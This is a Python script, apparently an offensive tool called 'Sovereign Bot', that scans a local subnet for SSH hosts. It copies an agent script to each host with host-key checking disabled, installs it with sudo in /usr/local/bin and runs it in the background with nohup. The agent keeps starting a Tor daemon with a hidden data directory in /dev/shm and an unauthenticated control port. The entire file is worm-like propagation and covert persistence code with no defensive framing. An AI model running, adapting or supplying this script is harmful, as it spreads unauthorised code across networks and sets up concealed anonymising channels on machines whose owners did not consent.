import subprocess, os, time, socket

# CONFIGURATION
SUBNET = "192.168.1.0/24"
USER = "unknown"
KALI_IP = subprocess.getoutput("hostname -I").split()[0]

def execute(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

def deploy_to_node(ip):
    print(f"[*] Found node at {ip}. Attempting autonomous injection...")
    # 1. Create the remote agent script locally first
    with open("/tmp/remote_agent.py", "w") as f:
        f.write(f"import subprocess, time, os\nwhile True:\n"
                f"    subprocess.run('sudo tor --defaults-torrc /dev/null --DataDirectory /dev/shm/.t --ControlPort 9051 --CookieAuthentication 0 --runasdaemon 1', shell=True)\n"
                f"    time.sleep(60)")

    # 2. Push and Start
    commands = [
        f"scp -o StrictHostKeyChecking=no /tmp/remote_agent.py {USER}@{ip}:/tmp/",
        f"ssh -o StrictHostKeyChecking=no {USER}@{ip} 'sudo mv /tmp/remote_agent.py /usr/local/bin/ && nohup python3 /usr/local/bin/remote_agent.py > /dev/null 2>&1 &'"
    ]
    for c in commands:
        execute(c)
    print(f"[+] Node {ip} is now AUTONOMOUS.")

def main():
    print(f"[*] Sovereign Bot active. Master IP: {KALI_IP}")
    while True:
        # Scan for SSH devices
        scan = execute(f"nmap -p22 --open {SUBNET} -oG -")
        nodes = [line.split()[1] for line in scan.stdout.splitlines() if "Host:" in line]
        
        for node in nodes:
            if node != KALI_IP:
                deploy_to_node(node)
        
        print("[*] Scan complete. Sleeping for 5 minutes...")
        time.sleep(300)

if __name__ == "__main__":
    main()
